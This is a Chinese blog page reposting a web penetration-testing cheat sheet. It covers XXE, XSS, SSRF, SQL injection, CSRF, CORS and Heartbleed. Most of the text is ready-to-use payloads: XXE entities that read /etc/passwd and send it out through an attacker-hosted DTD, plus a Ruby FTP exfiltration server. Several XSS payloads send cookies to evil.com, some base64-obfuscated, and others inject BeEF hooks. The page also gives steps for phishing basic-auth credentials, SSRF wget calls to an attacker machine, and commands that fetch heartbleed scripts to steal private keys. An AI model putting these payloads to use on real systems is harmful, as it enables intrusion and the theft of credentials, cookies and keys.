<!--
	作者：Sariay
	时间：2018-09-25
	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
-->


	<!DOCTYPE html>
	<html>
		

<head><meta name="generator" content="Hexo 3.8.0">
	<title>Web Fuzz</title>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="apple-mobile-web-app-title" content="Amaze UI">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <meta name="author" content="miraitowa">
    <meta name="keywords" content="">
    <meta name="description" content="">
   	<!-- css -->
	<link rel="stylesheet" href="/css/style.css">

	<!-- favicon -->
	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
	
	<!-- font-awesome -->
	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
</head>

	<body>	
		<!--Preloader-->
<div id="preloader">
	<div id="status">
		<img alt="PRELOADER" src="/img/logo.png">
	</div>
</div>
<!--Preloader end-->

<!-- header -->

	<header id="header-bg-2">

	
		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
	
	
	<!-- motto or description -->
		
 		<p class="motto"></p>
	
	
	<!-- current page name or title -->
	
		
		
			
			<p class="page-name">当前文章&nbsp;:&nbsp;《Web Fuzz》</p>
			
		
	
	
	<!-- others: such as change-bg, time... -->
	<p class="page-name-other">
		4/25/2019 
		<style type="text/css">
	header:after {
		content: '';
		position: relative;
		top: 0;
		left: 0;
		height: 100%;
		width: 100%;
		background: #222222;
		opacity: .5;
		z-index: -1;
	}
	
	.change-header-bg{
		font-style: normal;
	}
	.change-header-bg i{
		text-align: center;
		cursor: pointer;
		pointer-events: bounding-box;
	}
	@media(max-width:512px) {
		.change-header-bg {
			display: none;
			visibility: hidden;
		}
	}
	
</style>

<script type="text/javascript">
	function changeHeaderBg(){
		var random_bg = Math.floor(Math.random() * 109 + 1);
		var bg = 'url(https://miraitowa.github.io/Random-img/' + random_bg + '.jpg)';
		$("#header-bg-2").css("background-image", bg);
	}
</script>

<span class="change-header-bg">
	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
</span>
	</p>		
</header>

<!-- nav -->
<div id="cd-nav">
	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>

	<nav id="cd-main-nav">
		<ul>
			
      		<li class="fa fa-/">
           		<a href="/" title="主页">主页</a>	
      		</li>
    		
      		<li class="fa fa-/archives">
           		<a href="/archives" title="归档">归档</a>	
      		</li>
    		
      		<li class="fa fa-/categories">
           		<a href="/categories" title="分类">分类</a>	
      		</li>
    		
      		<li class="fa fa-/gallery">
           		<a href="/gallery" title="相册">相册</a>	
      		</li>
    		
      		<li class="fa fa-/about">
           		<a href="/about" title="关于">关于</a>	
      		</li>
    		
      		<li class="fa fa-/tags">
           		<a href="/tags" title="友链">友链</a>	
      		</li>
    		
    		
        	
		</ul>
	</nav>
</div>

		<!--main-->
		<main> 
		<div class="page-container">
		<!-- content srart -->
<div class="am-g am-g-fixed blog-fixed blog-content">
	<div class="am-u-md-8 am-u-sm-12">

		<article class="am-article blog-article-p">

			<div class="am-article-hd">
				


				<h1 class="am-article-title blog-text-center">
					
					
	
		<a href="/2019/03/21/Web Fuzz/" itemprop="url">		
			Web Fuzz		
		</a>
	

				</h1>

				<p class="am-article-meta blog-text-center">
					<span>
						<i class="fa fa-clock-o"></i> 
						<a href="/2019/03/21/Web Fuzz/" itemprop="url">
	<time datetime="2019-03-21T02:49:19.591Z" itemprop="datePublished">
  		2019-03-21
  </time>
</a>    
&nbsp;
					</span>
					
					<span>						
						
					</span>
				</p>
			</div>

			<div class="am-article-bd">
				<div class="content" id="post-content">
					
						<h2 id="Web-Fuzz"><a href="#Web-Fuzz" class="headerlink" title="Web Fuzz"></a>Web Fuzz</h2><p>转载于：wing大佬的文章：<a href="https://evilwing.me/2018/12/13/web-fuzz/" target="_blank" rel="noopener">https://evilwing.me/2018/12/13/web-fuzz/</a></p>
<h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><h4 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h4><p>发现post请求的接口的时候，可以这样试试：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY test &quot;THIS IS A STRING!&quot;&gt;
]&gt;
&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;
</code></pre><p>如果发现了一个错误：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a
[&lt;!ENTITY test &quot;nice string bro&quot;&gt;]
&gt;

&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;
</code></pre><p>说明能够解析，试试读文件：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a
[&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;]
&gt;

&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;
</code></pre><p>或者用php伪协议：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a
[&lt;!ENTITY test SYSTEM &quot;php://filter/convert.base64-encode/resource=index.php&quot;&gt;]
&gt;

&lt;methodCall&gt;&lt;methodName&gt;&amp;test;&lt;/methodName&gt;&lt;/methodCall&gt;
</code></pre><p>得到的结果再base64解码即可。</p>
<h3 id="webgoat8"><a href="#webgoat8" class="headerlink" title="webgoat8"></a>webgoat8</h3><h4 id="测试方法-1"><a href="#测试方法-1" class="headerlink" title="测试方法"></a>测试方法</h4><p>试一试是否可以添加实体的评论：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY test &quot;THIS IS A STRING!&quot;&gt;
]&gt;
&lt;comment&gt;&lt;text&gt;&amp;test;&lt;/text&gt;&lt;/comment&gt;
</code></pre><p>可以的话，试试file：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;
]&gt;
&lt;comment&gt;&lt;text&gt;&amp;test;&lt;/text&gt;&lt;/comment&gt;
MUTILLIDAE
</code></pre><p>要获取mutillidae上的文件，要在form表单提交的过程中使用测试的payload：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE a
[&lt;!ENTITY TEST SYSTEM &quot;file:///etc/passwd&quot;&gt;]
&gt;

&lt;methodCall&gt;&lt;methodName&gt;&amp;TEST;&lt;/methodName&gt;&lt;/methodCall&gt;
</code></pre><p>或者把xml版本忽略掉：</p>
<pre><code>&lt;!DOCTYPE a
[&lt;!ENTITY TEST SYSTEM &quot;file:///etc/passwd&quot;&gt;]
&gt;

&lt;methodCall&gt;&lt;methodName&gt;&amp;TEST;&lt;/methodName&gt;&lt;/methodCall&gt;
</code></pre><p>以及上面提到的php流：</p>
<pre><code>&lt;!DOCTYPE a
[&lt;!ENTITY TEST SYSTEM &quot;php://filter/convert.base64-encode/resource=phpinfo.php&quot;&gt;]
&gt;
&lt;methodCall&gt;&lt;methodName&gt;&amp;TEST;&lt;/methodName&gt;&lt;/methodCall&gt;
</code></pre><h3 id="OUT-OF-BAND"><a href="#OUT-OF-BAND" class="headerlink" title="OUT OF BAND"></a>OUT OF BAND</h3><h4 id="基础测试"><a href="#基础测试" class="headerlink" title="基础测试"></a>基础测试</h4><p>使用 burp 的collaborator 然后单击copy the payload to clipboard<br>将下面的code放入xml文件，然后上传：</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE foo [
   &lt;!ELEMENT foo ANY &gt;
   &lt;!ENTITY xxe SYSTEM &quot;http://burp.collab.server&quot; &gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
</code></pre><p>看看是否发送了请求</p>
<p><img src="https://i.imgur.com/8NINyf6.png" alt=""></p>
<p>成功后，再利用其他payload</p>
<h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p><strong>wing.xml</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;
&lt;!DOCTYPE data [
  &lt;!ENTITY % file SYSTEM
  &quot;file:///etc/lsb-release&quot;&gt;
  &lt;!ENTITY % dtd SYSTEM
  &quot;http://&lt;evil attacker hostname&gt;:8000/evil.dtd&quot;&gt;
  %dtd;
]&gt;
&lt;data&gt;&amp;send;&lt;/data&gt;
</code></pre><p><strong>vps-&gt;evil.dtd</strong></p>
<pre><code>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://&lt;evil attacker hostname&gt;:8000/?collect=%file;&#39;&gt;&quot;&gt; %all;
</code></pre><p><strong>host in dtd:</strong></p>
<pre><code>python -m SimpleHTTPServer 8000
</code></pre><p><strong>使用FTP读文件</strong></p>
<p><strong>evil.xml</strong></p>
<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE a [
&lt;!ENTITY % asd SYSTEM &quot;http://&lt;evil attacker hostname&gt;:8090/xxe_file.dtd&quot;&gt;
%asd;
%c;
]&gt;
&lt;a&gt;&amp;rrr;&lt;/a&gt;
</code></pre><p><strong>将dtd文件放在VPS上:</strong></p>
<pre><code>&lt;!ENTITY % d SYSTEM &quot;file:///etc/passwd&quot;&gt; 
&lt;!ENTITY % c &quot;&lt;!ENTITY rrr SYSTEM &#39;ftp://&lt;evil attacker hostname&gt;:2121/%d;&#39;&gt;&quot;&gt;
</code></pre><p><strong>ruby利用脚本：</strong></p>
<pre><code>require &#39;socket&#39;

ftp_server = TCPServer.new 2121
http_server = TCPServer.new 8088

log = File.open( &quot;xxe-ftp.log&quot;, &quot;a&quot;)

payload = &#39;&lt;!ENTITY % asd SYSTEM &quot;file:///etc/passwd&quot;&gt;&#39;

Thread.start do
loop do
  Thread.start(http_server.accept) do |http_client|
    puts &quot;HTTP. New client connected&quot; 
    loop {
        req = http_client.gets()
        break if req.nil?
        if req.start_with? &quot;GET&quot;
            http_client.puts(&quot;HTTP/1.1 200 OK\r\nContent-length: #{payload.length}\r\n\r\n#{payload}&quot;)    
        end
        puts req
    }  
    puts &quot;HTTP. Connection closed&quot; 
  end
end

end

Thread.start do
loop do
  Thread.start(ftp_server.accept) do |ftp_client|
    puts &quot;FTP. New client connected&quot;
    ftp_client.puts(&quot;220 xxe-ftp-server&quot;)
    loop {
        req = ftp_client.gets()
        break if req.nil?
        puts &quot;&lt; &quot;+req
        log.write &quot;get req: #{req.inspect}\n&quot;

        if req.include? &quot;LIST&quot;
            ftp_client.puts(&quot;drwxrwxrwx 1 owner group  1 Feb 21 04:37 test&quot;)
            ftp_client.puts(&quot;150 Opening BINARY mode data connection for /bin/ls&quot;)
            ftp_client.puts(&quot;226 Transfer complete.&quot;)
        elsif req.include? &quot;USER&quot;
            ftp_client.puts(&quot;331 password please - version check&quot;)
        elsif req.include? &quot;PORT&quot;
            puts &quot;! PORT received&quot;
            puts &quot;&gt; 200 PORT command ok&quot;
            ftp_client.puts(&quot;200 PORT command ok&quot;)
        else
            puts &quot;&gt; 230 more data please!&quot;
            ftp_client.puts(&quot;230 more data please!&quot;)
        end
    }
    puts &quot;FTP. Connection closed&quot; 
  end
end
end

loop do
    sleep(10000)
end
</code></pre><p><strong>fuzz</strong></p>
<p><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt</a></p>
<h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>对于asp的站点，我们用unicode编码尖括号，适用于存储型XSS：</p>
<pre><code>&#39;%uff1cscript%uff1ealert(&#39;XSS&#39;);%uff1c/script%uff1e&#39;
</code></pre><h4 id="文件上传的XSS"><a href="#文件上传的XSS" class="headerlink" title="文件上传的XSS"></a>文件上传的XSS</h4><p>发现上传点的时候，可以试试用payload作为文件名：</p>
<pre><code>&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;.png
</code></pre><p><strong>or：</strong></p>
<pre><code>&quot;&gt;&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;.png
</code></pre><p><strong>or:</strong></p>
<p><strong>“&gt;<svg onmouseover="alert(1)">.svg</svg></strong></p>
<h4 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h4><p><strong>stuff.svg</strong></p>
<pre><code>&lt;svg version=&quot;1.1&quot; baseProfile=&quot;full&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;
   &lt;polygon id=&quot;triangle&quot; points=&quot;0,0 0,50 50,0&quot; fill=&quot;#009900&quot; stroke=&quot;#004400&quot;/&gt;
   &lt;script type=&quot;text/javascript&quot;&gt;
  alert(&#39;XSS!&#39;);
   &lt;/script&gt;
&lt;/svg&gt;
</code></pre><h4 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h4><pre><code>&lt;html&gt;
&lt;head&gt;&lt;/head&gt;
&lt;body&gt;
&lt;something:script xmlns:something=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(1)&lt;/something:script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><h4 id="CSP-BYPASS"><a href="#CSP-BYPASS" class="headerlink" title="CSP BYPASS"></a>CSP BYPASS</h4><pre><code>script-src self: &lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;
</code></pre><h4 id="常用的payload"><a href="#常用的payload" class="headerlink" title="常用的payload"></a>常用的payload</h4><pre><code>1. svg/onload
1. &#39;-alert(1)-&#39;
1. eval(atob(&#39;YWxlcnQoMSk=&#39;))
1. &lt;iMg SrC=x OnErRoR=alert(1)&gt;
1. &lt;div onmouseover=&quot;alert(&#39;XSS&#39;);&quot;&gt;
1. &lt;/Textarea/&lt;/Noscript/&lt;/Pre/&lt;/Xmp&gt;&lt;Svg /Onload=confirm(document.domain)&gt;


- ```&quot;&quot;[(!1+&quot;&quot;)[3]+(!0+&quot;&quot;)[2]+(&#39;&#39;+{})[2]][(&#39;&#39;+{})[5]+(&#39;&#39;+{})[1]+((&quot;&quot;[(!1+&quot;&quot;)[3]+(!0+&quot;&quot;)[2]+(&#39;&#39;+{})[2]])+&quot;&quot;)[2]+(!1+&#39;&#39;)[3]+(!0+&#39;&#39;)[0]+(!0+&#39;&#39;)[1]+(!0+&#39;&#39;)[2]+(&#39;&#39;+{})[5]+(!0+&#39;&#39;)[0]+(&#39;&#39;+{})[1]+(!0+&#39;&#39;)[1]](((!1+&quot;&quot;)[1]+(!1+&quot;&quot;)[2]+(!0+&quot;&quot;)[3]+(!0+&quot;&quot;)[1]+(!0+&quot;&quot;)[0])+&quot;(1)&quot;)()


oNcliCk=alert(1)%20)//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;%5Cx3csVg/&lt;img/src/onerror=alert(2)&gt;%5Cx3e
</code></pre><h4 id="AUTH-CRED"><a href="#AUTH-CRED" class="headerlink" title="AUTH CRED"></a>AUTH CRED</h4><p>遇到http-only的时候：<br>使用钓鱼的基本身份验证获取其凭据</p>
<ol>
<li>注册一个和目标类似的域名</li>
<li><a href="https://github.com/ryhanson/phishery" target="_blank" rel="noopener">https://github.com/ryhanson/phishery</a></li>
<li>编译然后运行</li>
<li>设置payload<code>—-&lt;img/src/onerror=document.location=&quot;https://evil.com/&quot;&gt;</code></li>
<li>等待目标上线</li>
</ol>
<p>可还行</p>
<p><img src="https://i.imgur.com/kgHhCJO.png" alt=""></p>
<h4 id="偷Cookie"><a href="#偷Cookie" class="headerlink" title="偷Cookie"></a>偷Cookie</h4><pre><code>&lt;img/src/onerror=document.location=&quot;http://evil.com:8090/cookiez.php?c=&quot;+document.cookie&gt;
</code></pre><p>Blacklist bypass:</p>
<p>过滤了<code>//,:,&quot;,&lt;和&gt;</code></p>
<pre><code>btoa(&#39;document.location=&quot;http://evil.com:8090/r.php?c=&quot;+document.cookie&#39;)
</code></pre><p>payload:</p>
<pre><code>eval(atob(&#39;ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbTo4MDkwL3IucGhwP2M9Iitkb2N1bWVudC5jb29raWU=&#39;))
</code></pre><p>另外一个：</p>
<pre><code>&lt;script&gt;new Image().src=&quot;http://evil.com:8090/b.php?&quot;+document.cookie;&lt;/script&gt;
</code></pre><p>比较不错的一个payload：</p>
<pre><code>&lt;svg onload=fetch(&quot;//attacker/r.php?=&quot;%2Bcookie)&gt;
</code></pre><p>nc 监听：</p>
<pre><code>nc -lvp 8090
</code></pre><h4 id="测试session劫持"><a href="#测试session劫持" class="headerlink" title="测试session劫持"></a>测试session劫持</h4><p>利用burp重放功能进行测试。</p>
<p>看不同cookie会有什么变化。</p>
<h4 id="FILTER-BYPASS-RESOURCES"><a href="#FILTER-BYPASS-RESOURCES" class="headerlink" title="FILTER BYPASS RESOURCES"></a>FILTER BYPASS RESOURCES</h4><p>收集到的payload：</p>
<pre><code>1. https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
1. https://bittherapy.net/a-trick-to-bypass-an-xss-filter-and-execute-javascript/
1. https://support.portswigger.net/customer/portal/articles/2590820-bypassing-signature-based-xss-filters-modifying-script-code
1. https://brutelogic.com.br/blog/avoiding-xss-detection/
1. https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec
</code></pre><h4 id="基于POST的XSS"><a href="#基于POST的XSS" class="headerlink" title="基于POST的XSS"></a>基于POST的XSS</h4><p>如果遇到无法将基于POST的XSS转换为GET请求的情况(可能目标服务器上禁用了GET请求)，试试CSRF。</p>
<h4 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h4><pre><code>&lt;target.com&gt;/#&lt;img/src/onerror=alert(&quot;XSS&quot;)&gt;
</code></pre><p>beef的hook，urlencode</p>
<pre><code>&lt;target.com&gt;/#img/src/onerror=$(&quot;body&quot;).append(decodeURIComponent(&#39;%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%3a%2f%2f%3c%65%76%69%6c%20%69%70%3e%3a%33%30%30%30%2f%68%6f%6f%6b%2e%6a%73%3e%3c%2f%73%63%72%69%70%74%3e&#39;))&gt;

1. #&lt;img/src=&quot;1&quot;/onerror=alert(1)&gt;
1. #&gt;&lt;img src=x onerror=prompt(1);&gt;
2. 
</code></pre><p>这些站点有大量的xss payload</p>
<pre><code>1. https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
1. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS injection
1. https://zseano.com/tutorials/4.html
1. https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md
1. http://www.smeegesec.com/2012/06/collection-of-cross-site-scripting-xss.html
1. http://www.xss-payloads.com/payloads-list.html?a#category=all
</code></pre><p>payload生成：</p>
<pre><code>xssor.io
http：//www.jsfuck.com/ 
https://github.com/aemkei/jsfuck 
https://convert.town/ascii-to-text
http://jdstiles.com/java/cct.html
</code></pre><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><p>在可以控制url参数的情况下，只要不重定向，就可以测试一下SSRF。<br>Webhooks, PDF 生成， 文档解析, 文件上传这些地方都可以重点关注一下。</p>
<p>PS:<a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF" target="_blank" rel="noopener">https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF</a></p>
<p>想办法探测内网资产：<a href="http://internal-server:22/notarealfile.txt" target="_blank" rel="noopener">http://internal-server:22/notarealfile.txt</a><br>更换端口，查看回显，判断端口的开放。<br>没有回显的情况下，按照响应时间判断，以及DNSLOG，这玩意burp自带的也好用的。<br>根据我的经验，一些组件只能使用某些端口，例如80,8080,443等。最好对这些端口进行测试。</p>
<p>如果你的payload中有路径，最好带上&amp;,#</p>
<pre><code>1. http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000&amp;
1. http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000#
</code></pre><p>这篇文章对SOP和CORS以及SSRF都有很好的讲解：https//<a href="http://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/" target="_blank" rel="noopener">www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/</a></p>
<p>Bug Bounty Write-ups:</p>
<pre><code>1. https://hackerone.com/reports/115748
1. https://hackerone.com/reports/301924
1. https://www.sxcurity.pro/hackertarget/
1. http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html
1. https://seanmelia.files.wordpress.com/2016/07/ssrf-to-pivot-internal-networks.pdf
1. https://github.com/ngalongc/bug-bounty-reference#server-side-request-forgery-ssrf
1. https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/
</code></pre><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>使用SQLMap在PUT REST Params中测试SQLi：</p>
<ol>
<li>使用 *标记Vulnerable参数</li>
<li>复制请求并将其粘贴到文件中。</li>
<li>用sqlmap运行：<br>sqlmap -r <file with="" request=""> -vvvv<br>备忘录:<a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></file></li>
</ol>
<p>可以试试双编码输入。</p>
<h3 id="会话固定"><a href="#会话固定" class="headerlink" title="会话固定"></a>会话固定</h3><p>快速检查的方法，可用于确定会话固定漏洞是否是网站上的问题：</p>
<p>转到登录页面，观察未经身份验证的用户拥有的会话ID。</p>
<p>登录该站点。进入后，观察用户拥有的会话ID。如果会话ID与用户进行身份验证之前由站点提供的会话ID匹配，那么存在会话固定漏洞。</p>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>一些绕过技术，即使有CSRF Token:<br><a href="https://zseano.com/tutorials/5.html" target="_blank" rel="noopener">https://zseano.com/tutorials/5.html</a></p>
<p>csrf和reset api:</p>
<pre><code>&lt;html&gt;
&lt;script&gt;
function jsonreq() {
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.open(&quot;POST&quot;,&quot;https://target.com/api/endpoint&quot;, true);
  xmlhttp.setRequestHeader(&quot;Content-Type&quot;,&quot;text/plain&quot;);
  //xmlhttp.setRequestHeader(&quot;Content-Type&quot;, &quot;application/json;charset=UTF-8&quot;);
  xmlhttp.withCredentials = true;
  xmlhttp.send(JSON.stringify({&quot;test&quot;:&quot;x&quot;}));
}
jsonreq();
&lt;/script&gt;
&lt;/html&gt;
</code></pre><p>案例:</p>
<pre><code>https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b
http://c0rni3sm.blogspot.com/2018/01/1800-in-less-than-hour.html
</code></pre><h4 id="CSRF-TO-REDECT-XSS"><a href="#CSRF-TO-REDECT-XSS" class="headerlink" title="CSRF TO REDECT XSS"></a>CSRF TO REDECT XSS</h4><pre><code>&lt;html&gt;
  &lt;body&gt;
&lt;p&gt;Please wait... ;)&lt;/p&gt;
&lt;script&gt;
let host = &#39;http://target.com&#39;
let beef_payload = &#39;%3c%73%63%72%69%70%74%3e%20%73%3d%64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74%28%27%73%63%72%69%70%74%27%29%3b%20%73%2e%74%79%70%65%3d%27%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%27%3b%20%73%2e%73%72%63%3d%27%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d%2f%68%6f%6f%6b%2e%6a%73%27%3b%20%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%27%68%65%61%64%27%29%5b%30%5d%2e%61%70%70%65%6e%64%43%68%69%6c%64%28%73%29%3b%20%3c%2f%73%63%72%69%70%74%3e&#39;
let alert_payload = &#39;%3Cimg%2Fsrc%2Fonerror%3Dalert(1)%3E&#39;

function submitRequest() {
  var req = new XMLHttpRequest();
  req.open(&lt;CSRF components, which can easily be copied from Burp&#39;s POC generator&gt;);
  req.setRequestHeader(&quot;Accept&quot;, &quot;*\/*&quot;);
  req.withCredentials = true;
  req.onreadystatechange = function () {
if (req.readyState === 4) {
  executeXSS();
}
  }
  req.send();
}

function executeXSS() {
  window.location.assign(host+&#39;&lt;URI with XSS&gt;&#39;+alert_payload);
}

submitRequest();
&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>在OS X上创建测试10g文件（对于测试文件上载限制很有用）：</p>
<pre><code>mkfile -n 10g temp_10GB_file
</code></pre><h4 id="无限制的文件上传"><a href="#无限制的文件上传" class="headerlink" title="无限制的文件上传"></a>无限制的文件上传</h4><p>资源:</p>
<pre><code>http://nileshkumar83.blogspot.com/2017/01/file-upload-through-null-byte-injection.html
</code></pre><p>一些备忘录:<a href="https://github.com/jhaddix/tbhm" target="_blank" rel="noopener">https://github.com/jhaddix/tbhm</a></p>
<h4 id="CORS配置错误"><a href="#CORS配置错误" class="headerlink" title="CORS配置错误"></a>CORS配置错误</h4><p>用于测试的POC:</p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;body&gt;
&lt;center&gt;
  &lt;h2&gt;CORS POC Exploit&lt;/h2&gt;

  &lt;div id=&quot;demo&quot;&gt;
&lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Exploit&lt;/button&gt;
  &lt;/div&gt;

  &lt;script&gt;
function cors() {
  var req = new XMLHttpRequest();
  req.onreadystatechange = function() {
if (this.readyState == 4 &amp;&amp; this.status == 200) {
  document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;
  // If you want to print something out after it finishes:
  //alert(req.getAllResponseHeaders());
  //alert(localStorage.access_token);
}
  };
  // If you need to set a header (you probably won&#39;t):
  // req.setRequestHeader(&quot;header name&quot;, &quot;value&quot;);
  req.open(&quot;GET&quot;, &quot;&lt;site&gt;&quot;, true);
  req.withCredentials = true;
  req.send();
}
  &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>资源:</p>
<blockquote>
<pre><code>1. https://www.securityninja.io/understanding-cross-origin-resource-sharing-cors/
1. http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html
1. https://www.youtube.com/watch?v=wgkj4ZgxI4c
1. http://ejj.io/misconfigured-cors/
1. https://www.youtube.com/watch?v=lg31RYYG-T4
1. https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS
1. https://w3c.github.io/webappsec-cors-for-developers/#cors
1. http://gerionsecurity.com/2013/11/cors-attack-scenarios/
1. Using CORS misconfiguration to steal a CSRF Token:
1. https://yassineaboukir.com/blog/security-impact-of-a-misconfigured-cors-implementation/
</code></pre></blockquote>
<h3 id="测试心脏出血漏洞"><a href="#测试心脏出血漏洞" class="headerlink" title="测试心脏出血漏洞"></a>测试心脏出血漏洞</h3><pre><code>nmap -d --script ssl-heartbleed --script-args vulns.showall -sV -p &lt;port&gt; &lt;target ip&gt; --script-trace -oA heartbleed-%y%m%d
</code></pre><h4 id="偷私钥"><a href="#偷私钥" class="headerlink" title="偷私钥"></a>偷私钥</h4><pre><code>wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
echo &quot;&lt;target&gt;:&lt;port&gt;&quot; &gt; targets.txt
python heartbleed.py -f targets.txt -v -e

wget https://raw.githubusercontent.com/sensepost/heartbleed-poc/master/heartbleed-poc.py
python heartbleed-poc.py &lt;target&gt; -p &lt;target port&gt; | less
https://gist.github.com/bonsaiviking/10402038
https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
</code></pre><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p><a href="http://breenmachine.blogspot.com/2013/01/abusing-open-redirects-to-bypass-xss.html" target="_blank" rel="noopener">http://breenmachine.blogspot.com/2013/01/abusing-open-redirects-to-bypass-xss.html</a></p>
<p>重定向到beef：</p>
<pre><code>&lt;script&gt; s=document.createElement(&#39;script&#39;); s.type=&#39;text/javascript&#39;; s.src=&#39;http://evil.com:3000/hook.js&#39;; document.getElementsByTagName(&#39;head&#39;)[0].appendChild(s); &lt;/script&gt;
</code></pre><p>使用Burp中的Decoder将其编码为base-64，并将其传递给payload：</p>
<pre><code>data:text/html;base64,PHNjcmlwdD4gcz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTsgcy50eXBlPSd0ZXh0L2phdmFzY3JpcHQnOyBzLnNyYz0naHR0cDovL2V2aWwuY29tOjMwMDAvaG9vay5qcyc7IGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdoZWFkJylbMF0uYXBwZW5kQ2hpbGQocyk7IDwvc2NyaXB0Pg==
</code></pre><p>other：</p>
<pre><code>http://;URL=javascript:alert(&#39;XSS&#39;)
